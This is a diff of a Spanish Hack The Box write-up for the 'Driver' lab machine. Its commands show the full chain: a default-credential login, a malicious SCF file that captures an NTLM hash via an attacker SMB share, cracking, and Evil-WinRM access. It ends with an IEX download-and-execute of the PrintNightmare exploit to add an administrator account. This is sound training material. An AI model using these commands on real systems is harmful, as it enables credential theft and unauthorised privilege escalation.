@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Driver - Hack The Box
-excerpt: "Es una máquina relativamente sencilla, comenzamos entrando al puerto 80, el cual nos pedirá credenciales para poder entrar, adivinamos las credenciales y enumerando el sitio web, encontramos que podemos subir archivos. La página acepta archivos SCF, podemos obtener un hash que contiene usuario y contraseña del protocolo SMB si cargamos un archivo SCF malicioso. Crackeando el hash con la herramienta JohnTheRipper nos conectamos de manera remota con Evil-WinRM al protocolo SMB y gracias a la herramienta WinPEAS, encontramos el proceso spoolv activo, que es vulnerable al Exploit CVE-2021-1675 - PrintNightmare LPE, siendo que podemos crear un usuario administrador nuevo y nuevamente con Evil-WinRM ganamos acceso como Administrador en la máquina Windows."
+excerpt: "Es una máquina relativamente sencilla, comenzamos entrando al servicio HTTP, el cual nos pedirá credenciales para poder entrar, adivinamos las credenciales y enumerando el sitio web, encontramos que podemos subir archivos. La página acepta archivos SCF, podemos obtener un hash que contiene usuario y contraseña del protocolo SMB si cargamos un archivo SCF malicioso. Crackeando el hash con la herramienta JohnTheRipper nos conectamos de manera remota con Evil-WinRM al protocolo SMB y gracias a la herramienta WinPEAS, encontramos el proceso spoolv activo, que es vulnerable al Exploit CVE-2021-1675 - PrintNightmare LPE, siendo que podemos crear un usuario administrador nuevo y nuevamente con Evil-WinRM ganamos acceso como Administrador en la máquina Windows."
 date: 2023-05-22
 classes: wide
 header:
@@ -17,19 +17,27 @@ tags:
   - MFP Firmware Upload
   - SCF Malicious File
   - Cracking Hash
-  - Privesc - Proceso Spoolsv
+  - Abusing Vuln Process Spoolsv
   - PrintNightmare Exploit (CVE-2021-1675)
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-driver/driver_logo.png)
 
-Es una máquina relativamente sencilla, comenzamos entrando al **puerto 80**, el cual nos pedirá credenciales para poder entrar, adivinamos las credenciales y enumerando el sitio web, encontramos que podemos subir archivos. La página acepta archivos SCF, podemos obtener un **hash** que contiene usuario y contraseña del protocolo **SMB** si cargamos un archivo **SCF malicioso**. **Crackeando** el **hash** con la herramienta **JohnTheRipper** nos conectamos de manera remota con **Evil-WinRM** al protocolo **SMB** y gracias a la herramienta **WinPEAS**, encontramos el proceso **spoolv** activo, que es vulnerable al **Exploit CVE-2021-1675 - PrintNightmare LPE**, siendo que podemos crear un usuario administrador nuevo y nuevamente con **Evil-WinRM** ganamos acceso como **Administrador** en la máquina **Windows**.
+Es una máquina relativamente sencilla, comenzamos entrando al **servicio HTTP**, el cual nos pedirá credenciales para poder entrar, adivinamos las credenciales y enumerando el sitio web, encontramos que podemos subir archivos. La página acepta archivos SCF, podemos obtener un **hash** que contiene usuario y contraseña del protocolo **SMB** si cargamos un archivo **SCF malicioso**. **Crackeando** el **hash** con la herramienta **JohnTheRipper** nos conectamos de manera remota con **Evil-WinRM** al protocolo **SMB** y gracias a la herramienta **WinPEAS**, encontramos el proceso **spoolv** activo, que es vulnerable al **Exploit CVE-2021-1675 - PrintNightmare LPE**, siendo que podemos crear un usuario administrador nuevo y nuevamente con **Evil-WinRM** ganamos acceso como **Administrador** en la máquina **Windows**.
 
 Herramientas utilizadas para resolver esta máquina:
-* *John The Ripper*
+* *ping*
+* *nmap*
+* *Wappalizer*
+* *impacket-smbserver*
+* *JohnTheRipper*
 * *Crackmapexec*
 * *Evil-WinRM*
+* *whoami*
+* *systeminfo*
 * *winPEAS*
+* *python3*
+* *net*
 
 
 <br>
@@ -45,7 +53,7 @@ Herramientas utilizadas para resolver esta máquina:
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#HTTP">Analizando Puerto 80</a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
@@ -54,7 +62,10 @@ Herramientas utilizadas para resolver esta máquina:
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#WinPEAS">Utilizando WinPEAS para Encontrar Vulnerabilidades</a></li>
+				<li><a href="#Enum">Enumerando Máquina Víctima</a></li>
+				<ul>
+					<li><a href="#WinPEAS">Utilizando WinPEAS para Encontrar Vulnerabilidades</a></li>
+				</ul>
 				<li><a href="#Exploit">Utilizando Exploit PrintNightmare LPE</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
@@ -66,15 +77,13 @@ Herramientas utilizadas para resolver esta máquina:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:125%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
 
 <h2 id="Ping">Traza ICMP</h2>
+
 Vamos a realizar un **ping** para saber si la máquina está activa y en base al **TTL** veremos que **SO** opera en la máquina.
 ```bash
 ping -c 4 10.10.11.106
@@ -91,6 +100,7 @@ rtt min/avg/max/mdev = 138.484/139.591/142.586/1.731 ms
 Por el **TTL** sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.
 
 <h2 id="Puertos">Escaneo de Puertos</h2>
+
 ```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.106 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
@@ -130,6 +140,7 @@ Nmap done: 1 IP address (1 host up) scanned in 28.56 seconds
 Veo solamente 3 puertos abiertos y pienso que la intrusión será por el **puerto 80** o por el **puerto 445**, veamos que nos dice el escaneo de servicios.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
+
 ```bash
 nmap -sC -sV -p80,135,445 10.10.11.106 -oN targeted
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 19:04 CST
@@ -175,19 +186,17 @@ Nmap done: 1 IP address (1 host up) scanned in 48.88 seconds
 
 Mmmmm veo cosas raras, por ejemplo en el **puerto 80** menciona que debemos meter una contraseña para el usuario admin, entonces no sé qué pueda ser.
 
+
 <br>
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:125%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
 
-<h2 id="HTTP">Analizando Puerto 80</h2>
+<h2 id="HTTP">Analizando Servicio HTTP</h2>
 
 Entremos.
 
@@ -213,7 +222,7 @@ Mmmmm, pues antes de irnos a ver el puerto 445, tratemos de poner credenciales c
 <img src="/assets/images/htb-writeup-driver/Captura4.png">
 </p>
 
-a...es neta? Bueno, al primer intento jsjsjs. El usuario y contraseña que puse, fueron:
+a... Bueno, el usuario y contraseña que puse, fueron:
 * **User**: admin
 * **Passwd**: admin
 
@@ -223,7 +232,7 @@ Veamos que dice el **Wappalizer**:
 <img src="/assets/images/htb-writeup-driver/Captura5.png">
 </p>
 
-Vaya, vaya, veo que está programado en **PHP**, investiguemos la página para ver si podemos incluir archivos.
+Veo que está programado en **PHP**, investiguemos la página para ver si podemos incluir archivos.
 
 <p align="center">
 <img src="/assets/images/htb-writeup-driver/Captura6.png">
@@ -249,7 +258,9 @@ Entonces, ¿Qué podemos hacer? Existe una forma de obtener un **hash** de un us
 
 | **Extensión .scf** |
 |:------------------:|
-| Los **archivos SCF** pertenecen principalmente a **Windows de Microsoft**. Un **archivo SCF es un archivo que almacena información sobre la secuencia de ADN y que actúa de forma similar a un archivo ABI, pero contiene más información y es menos propenso a errores**. También **son utilizados por el símbolo del sistema operativo Windows como archivo de comandos Shell**. En esta aplicación, el **archivo SCF almacena comandos de shell, y es similar a los archivos BAT o CMD**. |
+| *Los archivos SCF pertenecen principalmente a Windows de Microsoft. Un archivo SCF es un archivo que almacena información sobre la secuencia de ADN y que actúa de forma similar a un archivo ABI, pero contiene más información y es menos propenso a errores. También son utilizados por el símbolo del sistema operativo Windows como archivo de comandos Shell. En esta aplicación, el archivo SCF almacena comandos de shell, y es similar a los archivos BAT o CMD*. |
+
+<br>
 
 Aquí más información sobre estos archivos: <a href="https://filext.com/es/extension-de-archivo/SCF" target="_blank">Archivos con Extensión .scf</a>
 
@@ -259,7 +270,9 @@ Ahora, veamos de que trata ese **archivo malicioso SCF**:
 
 | **SCF Malicious File** |
 |:-----------------------:|
-| Durante un **test de intrusión**, es posible encontrarse con un **recurso de red de un servidor Windows con permisos de escritura para todos**. A parte de intentar obtener **información sensible**, existe una forma para **abusar de este recurso y poder obtener los hashes de las contraseñas de todos los usuarios que naveguen por esa carpeta compartida**. Para ello, se utilizará un **archivo SCF malicioso**. Se trata de un **Shell Command File**, es decir, un **archivo de comandos de Windows Explorer**, que nosotros usaremos para **enviar el archivo SCF malicioso**. Se puede usar un **archivo SCF para acceder a una ruta UNC específica que permite que el probador de penetración cree un ataque.** |
+| *Durante un test de intrusión, es posible encontrarse con un recurso de red de un servidor Windows con permisos de escritura para todos. A parte de intentar obtener información sensible, existe una forma para abusar de este recurso y poder obtener los hashes de las contraseñas de todos los usuarios que naveguen por esa carpeta compartida. Para ello, se utilizará un archivo SCF malicioso. Se trata de un Shell Command File, es decir, un archivo de comandos de Windows Explorer, que nosotros usaremos para enviar el archivo SCF malicioso. Se puede usar un archivo SCF para acceder a una ruta UNC específica que permite que el probador de penetración cree un ataque.* |
+
+<br>
 
 Aquí puedes encontrar más información sobre este ataque:
 * <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" target="_blank">Archivo Malicioso .SCF 1</a>
@@ -278,10 +291,7 @@ Copialo en un archivo nuevo y vamos a modificarlo para que descargue un archivo 
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:125%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -297,6 +307,7 @@ IconFile=\\X.X.X.X\share\pentestlab.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
+
 * Modifica el código, poniendo tu **IP** y especificando el **servidor SMB**, recuerda que el archivo no importa que no exista:
 ```bash
 [Shell]  
@@ -305,6 +316,7 @@ IconFile=\\Tu_IP\smbFolder\pentestlab.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
+
 * Abre el servidor **SMB** en donde tengas el archivo **SCF**:
 ```bash
 impacket-smbserver smbFolder $(pwd) -smb2support
@@ -346,11 +358,13 @@ Este ataque se puede hacer con la herramienta **Responder**, pero es mejor usarl
 <h2 id="Hash">Descifrando Hash y Probando Credenciales</h2>
 
 Para descifrar el **hash**, vamos a copiarlo todo, guardarlo en un archivo y usaremos la herramienta **John The Ripper**, obvio por pasos:
+
 * Copia y pega todo el **hash** en un archivo:
 ```bash
 nano hash
 tony::DRIVER:aaaaaaaaaaaaaaaa:5a0d651031ca97e2d20e5abf5039dfcb:010
 ```
+
 * Usa el diccionario **rockyou.txt** junto a la herramienta **John The Ripper** para descifrar el **hash**:
 ```bash
 john -w=/usr/share/wordlists/rockyou.txt hash
@@ -374,6 +388,7 @@ crackmapexec smb 10.10.11.106 -u 'tony' -p 'liltony'
 SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
 SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony
 ```
+
 Bien, tratemos de ver si es posible conectarnos por **winrm** para poder usar la herramienta **Evil-WinRM** y conectarnos de manera remota:
 ```bash
 crackmapexec winrm 10.10.11.106 -u 'tony' -p 'liltony'
@@ -381,10 +396,10 @@ SMB         10.10.11.106    5985   DRIVER           [*] Windows 10.0 Build 10240
 HTTP        10.10.11.106    5985   DRIVER           [*] http://10.10.11.106:5985/wsman
 WINRM       10.10.11.106    5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
 ```
+
 Muy bien, ahora usa esa herramienta con las credenciales para conectarte:
 ```bash
 evil-winrm -i 10.10.11.106 -u 'tony' -p 'liltony'
-
 
 Evil-WinRM shell v3.4
 
@@ -396,6 +411,7 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\tony\Documents>
 ```
+
 Tardo un poquito, pero ya nos conectamos de manera remota, solo busca la flag y continuamos con las post explotación:
 ```batch
 *Evil-WinRM* PS C:\Users\tony> cd Desktop
@@ -419,13 +435,12 @@ Mode                LastWriteTime         Length Name
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:125%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
+
+<h2 id="Enum">Enumerando Máquina Víctima</h2>
 
 Como siempre, vamos a revisar privilegios:
 ```batch
@@ -442,6 +457,7 @@ SeUndockPrivilege             Remove computer from docking station Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
 SeTimeZonePrivilege           Change the time zone                 Enabled
 ```
+
 No veo algo que nos pueda ayudar, veamos la información del sistema para poder usar la herramienta **Windows Exploit Suggester**:
 ```batch
 *Evil-WinRM* PS C:\Users\tony\Desktop> systeminfo
@@ -449,9 +465,12 @@ systeminfo.exe : ERROR: Access denied
     + CategoryInfo          : NotSpecified: (ERROR: Access denied:String) [], RemoteException
     + FullyQualifiedErrorId : NativeCommandError
 ```
+
 A canijo, no pues no. Esta es una excelente oportunidad para usar la herramienta **WinPEAS**, que nos ayuda a **encontrar vulnerabilidades en sistemas Windows**.
 
-<h2 id="WinPEAS">Utilizando WinPEAS para Encontrar Vulnerabilidades</h2>
+<br>
+
+<h3 id="WinPEAS">Utilizando WinPEAS para Encontrar Vulnerabilidades</h3>
 
 Gracias a **Evil-WinRM**, podemos cargar la herramienta **WinPEAS** con el comando **upload** de la siguiente forma:
 ```batch
@@ -462,6 +481,7 @@ Data: 2703360 bytes of 2703360 bytes copied
 
 Info: Upload successful!
 ```
+
 Listo, puedes verificar que se cargó la herramienta:
 ```batch
 *Evil-WinRM* PS C:\Windows\Temp\Privesc> dir
@@ -474,6 +494,7 @@ Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----        5/23/2023   6:01 AM        2027520 winPEASx64.exe
 ```
+
 Y la ejecutamos:
 ```batch
 *Evil-WinRM* PS C:\Windows\Temp\Privesc> .\winPEASx64.exe
@@ -482,6 +503,7 @@ ANSI color bit for Windows is not set. If you are executing this from a Windows 
 ...
 ...
 ```
+
 Leyendo todo lo que nos sacó el **winPEASx64.exe**, vemos lo siguiente:
 ```batch
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
@@ -510,15 +532,18 @@ Existe un Exploit para **spoolsv** llamado **PrintNightmare LPE**, así que vamo
 Solamente vamos a ocupar el archivo **.ps1** que viene en el **GitHub**, cópialo en tu máquina con **wget**.
 
 Una vez que lo tengas copiado, vamos a subirlo a la máquina, a través de un **servidor en Python** y en la máquina con **IEX**, hagámoslo por pasos:
+
 * Abre el servidor en Python en donde tengas el Exploit:
 ```bash
 python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
+
 * Carga el Exploit en la máquina con **IEX**:
 ```batch
 *Evil-WinRM* PS C:\Windows\Temp\Privesc> IEX(New-Object Net.WebClient).downloadString('http://Tu_IP/CVE-2021-1675.ps1')
 ```
+
 * Vemos los usuarios que hay:
 ```batch
 *Evil-WinRM* PS C:\Windows\Temp\Privesc> net user
@@ -528,6 +553,7 @@ Administrator            DefaultAccount           Guest
 tony
 The command completed with one or more errors.
 ```
+
 * Usamos el código que viene en el GitHub para crear un nuevo usuario administrador:
 ```batch
 *Evil-WinRM* PS C:\Windows\Temp\Privesc> Invoke-Nightmare -DriverName "Xerox" -NewUser "berserkW" -NewPassword "SuperSecure"
@@ -536,6 +562,7 @@ The command completed with one or more errors.
 [+] added user berserkW as local administrator
 [+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
 ```
+
 * Comprobamos que se creó el nuevo usuario administrador:
 ```batch
 *Evil-WinRM* PS C:\Windows\Temp\Privesc> net user
@@ -545,6 +572,7 @@ Administrator            berserkW                 DefaultAccount
 Guest                    tony
 The command completed with one or more errors.
 ```
+
 * Comprobamos con **Crackmapexec**, si el usuario y contraseña sirven:
 ```bash
 crackmapexec winrm 10.10.11.106 -u 'berserkW' -p 'SuperSecure'
@@ -552,6 +580,7 @@ SMB         10.10.11.106    5985   DRIVER           [*] Windows 10.0 Build 10240
 HTTP        10.10.11.106    5985   DRIVER           [*] http://10.10.11.106:5985/wsman
 WINRM       10.10.11.106    5985   DRIVER           [+] DRIVER\berserkW:SuperSecure (Pwn3d!)
 ```
+
 * Nos conectamos por **Evil-WinRM** y obtenemos la flag:
 ```batch
 evil-winrm -i 10.10.11.106 -u 'berserkW' -p 'SuperSecure'
@@ -574,9 +603,6 @@ Listo, ya completamos esta máquina.
 <br>
 <div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
 </div>
 
 
@@ -589,3 +615,49 @@ Listo, ya completamos esta máquina.
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
+
